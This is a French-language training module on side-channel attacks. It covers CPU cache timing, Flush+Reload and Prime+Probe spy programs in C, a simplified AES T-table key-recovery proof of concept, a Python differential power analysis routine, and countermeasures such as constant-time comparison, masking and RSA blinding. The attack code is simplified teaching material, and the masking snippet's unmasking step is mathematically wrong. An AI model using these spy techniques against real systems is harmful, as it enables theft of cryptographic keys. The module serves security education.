# Module A11 : Side Channel Introduction - Attaques par canaux auxiliaires

## Objectifs pédagogiques

À la fin de ce module, tu seras capable de :
- Comprendre les principes des attaques side-channel (timing, cache, power)
- Implémenter une attaque cache timing (Flush+Reload) en C
- Mesurer et exploiter les fuites d'information timing
- Analyser les vulnérabilités side-channel dans du code cryptographique
- Appliquer les contre-mesures appropriées

## Prérequis

- Architecture CPU (cache hiérarchie, pipeline, exécution spéculative)
- C et assembleur pour timing précis (RDTSC)
- Statistiques de base (moyenne, variance, corrélation)
- Compréhension de la cryptographie (AES, RSA)

---

## Introduction

### Qu'est-ce qu'une attaque side-channel ?

Les **attaques side-channel** (canaux auxiliaires) exploitent les **fuites d'information indirectes** provenant de l'implémentation physique d'un système, plutôt que des failles logiques dans le code.

**Analogie :** Imagine que tu veuilles savoir si quelqu'un est chez lui sans regarder par la fenêtre. Tu pourrais :
- Mesurer la consommation électrique de la maison (lumières allumées ?)
- Écouter les bruits (télé, musique ?)
- Chronométrer les réponses (combien de temps pour répondre à la porte ?)

Les side-channels fonctionnent pareil : on observe des **effets secondaires** pour déduire des informations secrètes.

```
┌────────────────────────────────────────────────────────┐
│         Types de Side-Channel Attacks                  │
└────────────────────────────────────────────────────────┘

1. Timing Attack
   └─> Mesurer le temps d'exécution
   └─> Exemple : RSA sans blinding, AES sans constant-time

2. Cache Attack (Flush+Reload, Prime+Probe, Evict+Time)
   └─> Analyser l'état du cache CPU
   └─> Exemple : AES key recovery, Spectre, Meltdown

3. Power Analysis (SPA, DPA)
   └─> Mesurer la consommation électrique
   └─> Exemple : Smartcard AES/RSA key extraction

4. Electromagnetic Attack (EM)
   └─> Capter les émissions électromagnétiques
   └─> Exemple : TEMPEST, Van Eck phreaking

5. Acoustic Attack
   └─> Analyser les sons émis (coil whine, clavier)
   └─> Exemple : RSA key extraction via acoustic

6. Fault Injection
   └─> Induire des erreurs (voltage glitching, laser)
   └─> Exemple : Rowhammer (voir A13)
```

---

## Partie 1 : Cache Timing Attacks - Les fondamentaux

### Architecture des caches CPU

Les CPUs modernes utilisent une **hiérarchie de caches** pour accélérer l'accès mémoire.

```
┌────────────────────────────────────────────────────────┐
│         Hiérarchie mémoire CPU moderne                 │
└────────────────────────────────────────────────────────┘

CPU Core
  │
  ├─> L1 Cache (32-64 KB, ~4 cycles)
  │   ├─> L1d (Data cache)
  │   └─> L1i (Instruction cache)
  │
  ├─> L2 Cache (256-512 KB, ~12 cycles)
  │   └─> Privé par core
  │
  ├─> L3 Cache (8-64 MB, ~40 cycles)
  │   └─> Partagé entre tous les cores
  │
  └─> RAM (GB, ~200 cycles)
      └─> DRAM (DDR4/DDR5)
```

**Points critiques pour les attaques :**

- **L1/L2** : Privés par core → Attack cross-thread sur le même core
- **L3** : Partagé → Attack cross-core, cross-VM
- **Cache line** : 64 bytes → Résolution de l'attaque

**Mesurer le temps d'accès :**

```c
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_LINE 64

// Mesurer le temps d'accès à une adresse
uint64_t time_access(void* addr) {
    uint64_t start, end;
    volatile char dummy;

    start = __rdtsc();  // Read Time-Stamp Counter
    dummy = *(volatile char*)addr;
    end = __rdtsc();

    return end - start;
}

int main() {
    char data[CACHE_LINE];

    // Premier accès (cold cache)
    uint64_t t1 = time_access(data);
    printf("Cold cache: %lu cycles\n", t1);

    // Deuxième accès (hot cache)
    uint64_t t2 = time_access(data);
    printf("Hot cache: %lu cycles\n", t2);

    // Flush du cache
    _mm_clflush(data);
    _mm_mfence();

    // Troisième accès (cold après flush)
    uint64_t t3 = time_access(data);
    printf("After flush: %lu cycles\n", t3);

    return 0;
}
```

**Résultats typiques :**

```
Cold cache: 180 cycles  (miss → RAM)
Hot cache: 4 cycles     (hit → L1)
After flush: 190 cycles (miss → RAM)
```

---

## Partie 2 : Flush+Reload - La technique classique

### Principe de Flush+Reload

**Flush+Reload** exploite le cache partagé (L3) pour espionner les accès mémoire d'une victime.

```
┌────────────────────────────────────────────────────────┐
│             Flux Flush+Reload                          │
└────────────────────────────────────────────────────────┘

Attaquant (Thread A)
  │
  ├─> 1. Flush une ligne de cache
  │      └─> clflush(addr_cible)
  │
  ├─> 2. Attendre que la victime s'exécute
  │      └─> sleep ou yield
  │
  ├─> 3. Reload (mesurer le temps d'accès)
  │      └─> t = time_access(addr_cible)
  │
  └─> 4. Analyser
      ├─> Si t < 100 cycles → Victime a accédé (hot cache)
      └─> Si t > 100 cycles → Victime n'a pas accédé (cold cache)
```

**Prérequis :**

- Partage de mémoire avec la victime (shared library, deduplication, etc.)
- Accès à `clflush` (instruction unprivileged sur x86)

### PoC : Espionner l'exécution d'une fonction

**Victime (victim.c) :**

```c
#include <stdio.h>
#include <unistd.h>

void secret_function() {
    printf("Secret function executed!\n");
}

int main() {
    while (1) {
        secret_function();
        sleep(1);
    }
    return 0;
}
```

**Attaquant (spy.c) :**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <dlfcn.h>

#define THRESHOLD 100

uint64_t time_access(void* addr) {
    uint64_t start = __rdtsc();
    *(volatile char*)addr;
    uint64_t end = __rdtsc();
    return end - start;
}

int main() {
    // Obtenir l'adresse de secret_function (via symbol lookup)
    void* handle = dlopen("./victim", RTLD_LAZY);
    void* secret_addr = dlsym(handle, "secret_function");

    if (!secret_addr) {
        printf("Failed to find symbol\n");
        return 1;
    }

    printf("Spying on secret_function at %p\n", secret_addr);

    while (1) {
        // Flush
        _mm_clflush(secret_addr);
        _mm_mfence();

        // Attendre un peu
        usleep(10000);  // 10ms

        // Reload
        uint64_t t = time_access(secret_addr);

        if (t < THRESHOLD) {
            printf("[!] secret_function WAS CALLED (t=%lu)\n", t);
        }
    }

    return 0;
}
```

**Compilation et exécution :**

```bash
# Compiler la victime
gcc -o victim victim.c

# Compiler le spy
gcc -o spy spy.c -ldl

# Terminal 1 : Lancer la victime
./victim

# Terminal 2 : Lancer le spy
./spy
```

**Résultat :** Le spy détecte chaque exécution de `secret_function` !

---

## Partie 3 : AES Key Recovery via Flush+Reload

### Vulnérabilité dans AES (table-based)

Les implémentations AES classiques utilisent des **T-tables** pour accélérer le calcul.

**Code AES vulnérable :**

```c
// T-tables AES (4 tables de 256 entrées de 4 bytes)
uint32_t Te0[256], Te1[256], Te2[256], Te3[256];

void aes_encrypt_round(uint8_t* state, uint8_t* key) {
    uint32_t t0, t1, t2, t3;

    // Vulnerable : l'index dépend de la clé ET du plaintext
    t0 = Te0[state[0] ^ key[0]] ^
         Te1[state[5] ^ key[5]] ^
         Te2[state[10] ^ key[10]] ^
         Te3[state[15] ^ key[15]];

    // Les accès aux T-tables leakent de l'information via le cache !
}
```

**Attaque :**

1. Attaquant observe quelles lignes de `Te0/Te1/Te2/Te3` sont accédées
2. Déduit `state[i] ^ key[i]`
3. Si attaquant connaît le plaintext (état known-plaintext attack) → Récupère la clé !

**PoC simplifié :**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

extern uint32_t Te0[256];  // Supposons qu'on peut l'obtenir (shared lib, etc.)

#define THRESHOLD 100

uint64_t time_access(void* addr) {
    uint64_t start = __rdtsc();
    *(volatile uint32_t*)addr;
    uint64_t end = __rdtsc();
    return end - start;
}

void spy_aes_key() {
    uint8_t accessed[256] = {0};

    for (int round = 0; round < 1000; round++) {
        // Flush toutes les entrées de Te0
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&Te0[i]);
        }
        _mm_mfence();

        // Attendre que la victime encrypte
        usleep(100);

        // Reload : vérifier quelles entrées ont été accédées
        for (int i = 0; i < 256; i++) {
            uint64_t t = time_access(&Te0[i]);
            if (t < THRESHOLD) {
                accessed[i]++;
            }
        }
    }

    // Analyser les résultats
    printf("Most accessed Te0 indices (key leak):\n");
    for (int i = 0; i < 256; i++) {
        if (accessed[i] > 50) {  // Seuil arbitraire
            printf("  Te0[0x%02X] accessed %d times\n", i, accessed[i]);
        }
    }
}

int main() {
    spy_aes_key();
    return 0;
}
```

**Contre-mesure :** Implémenter AES en **constant-time** (bitslicing, AES-NI).

---

## Partie 4 : Prime+Probe - Attaque sans partage de mémoire

### Différence avec Flush+Reload

| Aspect | Flush+Reload | Prime+Probe |
|--------|--------------|-------------|
| **Prérequis** | Partage de mémoire | Aucun |
| **Cible** | Adresses précises | Sets de cache |
| **Résolution** | Ligne de cache (64 bytes) | Set de cache (~8 KB) |
| **Difficulté** | Moyenne | Haute |

### Principe de Prime+Probe

```
┌────────────────────────────────────────────────────────┐
│             Flux Prime+Probe                           │
└────────────────────────────────────────────────────────┘

Attaquant
  │
  ├─> 1. Prime : Remplir un set de cache avec nos données
  │      └─> Accéder à N adresses qui mappent au même set
  │
  ├─> 2. Attendre que la victime s'exécute
  │      └─> Si victime accède au même set → Evict nos données
  │
  ├─> 3. Probe : Mesurer le temps pour recharger nos données
  │      ├─> Si rapide → Nos données sont encore en cache (victime n'a pas accédé)
  │      └─> Si lent → Nos données ont été evicted (victime a accédé !)
  │
  └─> 4. Répéter pour tous les sets
```

**Code conceptuel :**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdlib.h>

#define CACHE_WAYS 16
#define CACHE_SETS 1024
#define CACHE_LINE 64

// Allouer des adresses qui mappent au même set
void* probe_set[CACHE_WAYS];

void prime(int set) {
    // Remplir le set avec nos données
    for (int i = 0; i < CACHE_WAYS; i++) {
        *(volatile char*)probe_set[i];
    }
}

uint64_t probe(int set) {
    uint64_t total_time = 0;

    for (int i = 0; i < CACHE_WAYS; i++) {
        uint64_t start = __rdtsc();
        *(volatile char*)probe_set[i];
        uint64_t end = __rdtsc();
        total_time += (end - start);
    }

    return total_time / CACHE_WAYS;
}

int main() {
    // Allouer mémoire pour Prime+Probe
    for (int i = 0; i < CACHE_WAYS; i++) {
        probe_set[i] = malloc(CACHE_LINE);
        // TODO: Calculer les adresses pour qu'elles mappent au même set
    }

    while (1) {
        prime(0);
        usleep(1000);  // Attendre la victime
        uint64_t t = probe(0);

        if (t > 100) {
            printf("[!] Victim accessed cache set 0 (t=%lu)\n", t);
        }
    }

    return 0;
}
```

---

## Partie 5 : Power Analysis - DPA sur AES

### Simple Power Analysis (SPA)

Analyse visuelle de la consommation électrique.

```
┌────────────────────────────────────────────────────────┐
│     Courbe de consommation AES                         │
└────────────────────────────────────────────────────────┘

Power (mW)
  │
  │     ┌─┐     ┌─┐     ┌─┐     ┌─┐
  │     │ │     │ │     │ │     │ │  ← Rounds AES visibles
  │   ┌─┘ └─┐ ┌─┘ └─┐ ┌─┘ └─┐ ┌─┘ └─┐
  │   │     │ │     │ │     │ │     │
  └───┴─────┴─┴─────┴─┴─────┴─┴─────┴─────> Time
      R1    R2    R3    R4    R5 ...
```

**Équipement nécessaire :**

- Oscilloscope (>100 MHz)
- Shunt resistor (0.1 Ohm) en série avec Vcc
- Connexion au device cible (smartcard, MCU, etc.)

### Differential Power Analysis (DPA)

Analyse statistique de milliers de traces.

**Principe :**

1. Capturer N traces de power pendant l'encryption avec différents plaintexts
2. Pour chaque hypothèse de clé k :
   - Calculer la valeur intermédiaire (ex: S-box output)
   - Prédire la consommation (Hamming weight)
   - Corréler avec les traces réelles
3. La clé correcte aura la plus haute corrélation

**Code Python simplifié :**

```python
import numpy as np

def hamming_weight(x):
    return bin(x).count('1')

def dpa_attack(traces, plaintexts, num_traces):
    best_key = 0
    best_corr = 0

    for key_guess in range(256):
        predictions = []

        for pt in plaintexts:
            # Hypothèse : première S-box d'AES
            intermediate = sbox[pt[0] ^ key_guess]
            predictions.append(hamming_weight(intermediate))

        # Corrélation avec les traces
        corr = np.corrcoef(predictions, traces[:, 100])[0, 1]  # Point de temps 100

        if abs(corr) > best_corr:
            best_corr = abs(corr)
            best_key = key_guess

    return best_key
```

---

## Partie 6 : Contre-mesures

### Code constant-time

**Principe :** L'exécution ne doit pas dépendre des données secrètes.

**Exemple : Comparaison sécurisée**

```c
// VULNÉRABLE (early return leak timing)
int strcmp_vulnerable(const char* a, const char* b) {
    while (*a && *b) {
        if (*a != *b) return 0;  // ← Leak position de la différence
        a++;
        b++;
    }
    return (*a == *b);
}

// SÉCURISÉ (constant-time)
int strcmp_secure(const char* a, const char* b, size_t len) {
    volatile uint8_t diff = 0;

    for (size_t i = 0; i < len; i++) {
        diff |= a[i] ^ b[i];  // Toujours faire len comparaisons
    }

    return (diff == 0);
}
```

### Masking (AES)

Randomiser les valeurs intermédiaires.

```c
// AES avec masking
uint8_t mask = rand() & 0xFF;
uint8_t masked_state = state ^ mask;

// S-box lookup sur donnée maskée
uint8_t result = sbox[masked_state] ^ sbox[mask];  // Unmask le résultat
```

### Blinding (RSA)

```c
// RSA avec blinding
// d = clé privée, n = modulus
// m = message, r = random

// 1. Blind
mpz_t blinded;
mpz_powm(blinded, r, e, n);  // r^e mod n
mpz_mul(blinded, blinded, m);  // blinded = m * r^e

// 2. Sign
mpz_powm(signature, blinded, d, n);  // signature = blinded^d

// 3. Unblind
mpz_invert(r_inv, r, n);  // r^-1
mpz_mul(signature, signature, r_inv);  // signature = (m * r^e)^d * r^-1 = m^d
```

---

## Résumé

| Type | Mesure | Cible | Contre-mesure |
|------|--------|-------|---------------|
| **Timing** | Temps d'exécution | Crypto, branch | Constant-time code |
| **Cache** | État du cache | AES, RSA, kernel | Cache partitioning, AES-NI |
| **Power** | Consommation | Smartcard, MCU | Masking, noise |
| **EM** | Émissions EM | Tous devices | Shielding, filtering |

**Progression logique :**

1. **A11_side_channel_intro** (ce module) : Comprendre les side-channels
2. **A12_spectre_meltdown** : Exploitation spéculative + cache
3. **A13_rowhammer** : Attaque physique DRAM
4. **A14_hardware_implants** : Backdoors matériels

## Ressources complémentaires

- **Flush+Reload paper** : https://eprint.iacr.org/2013/448.pdf
- **Mastik toolkit** : https://github.com/0xADE1A1DE/Mastik
- **ChipWhisperer** : https://github.com/newaetech/chipwhisperer
- **DPA Workstation** : https://www.riscure.com/

---

**Module suivant** : [A12 - Spectre & Meltdown](../A12_spectre_meltdown/)
